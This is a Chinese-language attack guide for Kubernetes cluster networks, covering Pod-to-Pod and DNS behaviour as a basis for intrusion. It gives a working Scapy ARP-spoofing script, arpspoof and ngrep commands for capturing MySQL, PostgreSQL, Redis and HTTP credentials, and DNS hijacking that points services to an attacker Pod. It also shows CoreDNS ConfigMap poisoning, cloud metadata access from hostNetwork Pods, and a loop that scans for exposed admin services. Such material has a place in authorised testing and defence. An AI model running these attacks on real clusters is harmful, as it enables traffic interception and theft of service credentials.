# K8s 集群网络攻击技术

## 1. K8s 网络基础

### 1.1 Pod 间网络通信

K8s 默认使用扁平网络模型——同一节点上的所有 Pod 通过网桥（通常叫 `cbr0`）互联。这个网桥工作在二层（以太网层），负责处理 ARP 解析。

关键安全含义：
- **同一节点上的所有 Pod 可以在二层直接通信**，无论属于哪个命名空间
- 默认情况下，K8s **不同命名空间之间没有网络隔离**
- 任何 Pod 都可以与其他 Pod/Service 通信（除非配置了 NetworkPolicy）
- `cbr0` 网桥处理 ARP 请求，这使得 ARP 欺骗攻击成为可能

### 1.2 K8s DNS 工作原理

Pod 的 DNS 请求流程：
```
Pod → 发往 Service IP（如 10.96.0.10）→ cbr0 网桥 NAT → CoreDNS Pod IP（如 172.17.0.2）
```

即使 DNS 服务器 Pod 和发起请求的 Pod 在同一子网，DNS 请求也**必须经过网桥**进行 Service IP 到 Pod IP 的转换。这意味着攻击者可以在网桥和 DNS Pod 之间实施 ARP 欺骗，拦截所有 DNS 请求。

```bash
# 查看集群 DNS 服务信息
kubectl -n kube-system describe services kube-dns
# 注意 Service IP（如 10.96.0.10）和实际 Endpoint IP（如 172.17.0.2）
# Pod 内查看 DNS 配置
cat /etc/resolv.conf
```

## 2. ARP 欺骗攻击

### 2.1 前提条件

- 攻击者 Pod 与目标 Pod 在**同一节点**上运行
- Pod 拥有 `NET_RAW` capability（**默认启用**）
- 未配置限制 ARP 的 NetworkPolicy 或安全策略

### 2.2 使用 Scapy 实施 ARP 欺骗

```bash
# 在攻击者 Pod 中安装工具
apt update && apt install -y python3-pip ngrep net-tools dnsutils
pip3 install scapy
```

ARP 欺骗脚本：
```python
#!/usr/bin/env python3
# arp_spoof.py
from scapy.all import *

def getmac(targetip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
    result = srp(pkt, timeout=2, verbose=False)[0]
    return result[0][1].hwsrc

def spoof(targetip, targetmac, sourceip):
    pkt = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(pkt, verbose=False)

def restore(targetip, targetmac, sourceip, sourcemac):
    pkt = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
    send(pkt, verbose=False)

targetip = input("目标 IP: ")     # 如 172.17.0.10（被害 Pod）
gatewayip = input("网关/目标2 IP: ")  # 如 172.17.0.9（数据库 Pod）

targetmac = getmac(targetip)
gatewaymac = getmac(gatewayip)
print(f"Target MAC: {targetmac}, Gateway MAC: {gatewaymac}")

try:
    print("开始 ARP 欺骗...")
    while True:
        spoof(targetip, targetmac, gatewayip)
        spoof(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
    restore(gatewayip, gatewaymac, targetip, targetmac)
    restore(targetip, targetmac, gatewayip, gatewaymac)
```

```bash
# 启用 IP 转发（否则流量到达攻击者 Pod 后无法转发，会导致断网）
echo 1 > /proc/sys/net/ipv4/ip_forward

# 启动 ARP 欺骗
python3 arp_spoof.py

# 另开终端抓包查看拦截到的流量
ngrep -d eth0
```

### 2.3 使用 arpspoof 工具

```bash
apt install -y dsniff
# 双向欺骗
arpspoof -t 172.17.0.10 172.17.0.9 &
arpspoof -t 172.17.0.9 172.17.0.10 &
# 抓取未加密的流量（如 MySQL 认证）
ngrep -d eth0 -W byline port 3306
```

## 3. DNS 欺骗攻击

### 3.1 基于 ARP 欺骗的 DNS 劫持

如果攻击者 Pod 与 DNS Server Pod 在**同一节点**，可以通过 ARP 欺骗拦截所有 DNS 请求，并返回伪造的响应：

```bash
# 使用 kube-dnsspoof 工具
# https://github.com/danielsagi/kube-dnsspoof/

# 创建欺骗规则文件
cat > hosts <<'EOF'
target-service.default.svc.cluster.local. ATTACKER_POD_IP
external-api.example.com. ATTACKER_POD_IP
EOF

# 对指定 Pod 发起 DNS 欺骗
python3 exploit.py --direct 172.17.0.10
# 输出:
# Bridge:  172.17.0.1 02:42:bd:63:07:8d
# Kube-dns:  172.17.0.2 02:42:ac:11:00:02
# [+] Taking over DNS requests from kube-dns...
```

关键注意事项：
- 不能简单修改 DNS 响应内容——必须构造新的 DNS 包，**源 IP 必须是 DNS Pod 的真实 IP**（如 172.17.0.2），而不是 Service IP（如 10.96.0.10）
- 如果 DNS Server 与攻击者 Pod 在同一节点，可以拦截**整个集群**的 DNS 请求

### 3.2 CoreDNS ConfigMap 投毒

如果拥有 kube-system 命名空间中 `coredns` ConfigMap 的写权限（`update`/`patch`），可以直接修改 DNS 解析规则：

```bash
# 查看当前 CoreDNS 配置
kubectl get configmap coredns -n kube-system -o yaml

# 添加 rewrite 规则劫持特定域名
# 例如：将 internal-api.default.svc.cluster.local 解析到攻击者 Pod
kubectl edit configmap coredns -n kube-system
# 在 Corefile 中添加:
#   rewrite name internal-api.default.svc.cluster.local attacker.default.svc.cluster.local

# 修改后 CoreDNS 自动 reload（默认 30s）
```

## 4. MITM 中间人攻击

### 4.1 Pod 间未加密流量拦截

K8s 默认**不加密 Pod 之间的通信**。结合 ARP 欺骗可以拦截任何同节点 Pod 间的明文流量：

```bash
# 拦截目标 Pod 的 HTTP 流量
ngrep -d eth0 -W byline "GET|POST|PUT|DELETE" port 80

# 拦截数据库认证和查询
ngrep -d eth0 port 3306    # MySQL
ngrep -d eth0 port 5432    # PostgreSQL
ngrep -d eth0 port 6379    # Redis

# 使用 tcpdump 保存全部流量供后续分析
tcpdump -i eth0 -w /tmp/capture.pcap -s 0
```

### 4.2 窃取服务间认证凭据

被拦截的明文流量中可能包含：
- 数据库用户名和密码
- API Token / Bearer Token
- gRPC 明文请求中的凭据
- 内部 HTTP API 的认证头
- Redis AUTH 密码

## 5. NetworkPolicy 枚举与绕过

### 5.1 枚举现有策略

```bash
# 查看所有 NetworkPolicy
kubectl get networkpolicies --all-namespaces

# Calico 网络策略
kubectl get globalnetworkpolicy --all-namespaces 2>/dev/null

# Cilium 网络策略
kubectl get ciliumnetworkpolicy --all-namespaces 2>/dev/null

# 查找所有策略相关 CRD
kubectl get crd | grep -i policy
```

### 5.2 NetworkPolicy 的局限性

即使配置了 NetworkPolicy，以下场景仍可能存在攻击面：
- NetworkPolicy **不限制同节点 Pod 间的二层通信**——ARP 欺骗仍然有效
- 许多 CNI 插件（如早期 Flannel）**不支持 NetworkPolicy 执行**
- `hostNetwork: true` 的 Pod 绑定到节点网络栈，NetworkPolicy 不适用
- NetworkPolicy 默认不限制出站（egress），除非显式配置
- NetworkPolicy 不能阻止对 Metadata API（169.254.169.254）的访问，需要单独配置

### 5.3 利用 hostNetwork 绕过

如果攻击者 Pod 使用 `hostNetwork: true`，它直接使用节点的网络栈：
```bash
# 在 hostNetwork Pod 中，可以直接访问节点网络
# 包括 IMDS Metadata、其他节点端口、宿主机上的服务
ip addr    # 看到的是节点的网卡
curl -s http://169.254.169.254/    # 直接访问云 Metadata

# 嗅探节点网卡上的所有流量
tcpdump -i eth0 -w /tmp/node-traffic.pcap
```

## 6. 暴露的 K8s 管理服务利用

集群内部可能运行未授权的管理平台，可作为攻击入口：

| 服务 | 默认端口 | 利用方式 |
|------|---------|---------|
| Kubernetes Dashboard | 8443/443 | 如果允许 skip login → 直接管理集群 |
| Kubeflow | 8080 | 创建 Notebook/Pipeline 获取代码执行 |
| Argo Workflows | 2746 | 创建 Workflow 运行任意容器 |
| Weave Scope | 4040 | 可视化集群拓扑 + 容器 exec |
| Apache NiFi | 8080 | 数据流处理 → 命令执行 |
| Prometheus | 9090 | 查询敏感指标 + 配置泄露 |
| Grafana | 3000 | 默认凭据 admin:admin |

```bash
# 在 Pod 中扫描常见管理服务端口
for port in 443 2746 3000 4040 8080 8443 9090; do
  for svc in $(kubectl get svc --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}.{.metadata.namespace} {end}' 2>/dev/null); do
    timeout 2 bash -c "echo >/dev/tcp/${svc}.svc.cluster.local/$port" 2>/dev/null && \
      echo "OPEN: $svc:$port"
  done
done
```

## 7. 流量抓取工具

### Mizu（现名 Kubeshark）

API 流量查看器，可在选定 Pod 上安装 agent 抓取流量：
```bash
# 需要高 K8s 权限
kubeshark tap
# 自动在目标 Pod 旁部署 agent 容器，抓取所有 API 通信
# 提供 Web UI 展示
```

注意：Mizu/Kubeshark 需要较高权限且不隐蔽，更适合蓝队或授权测试场景。
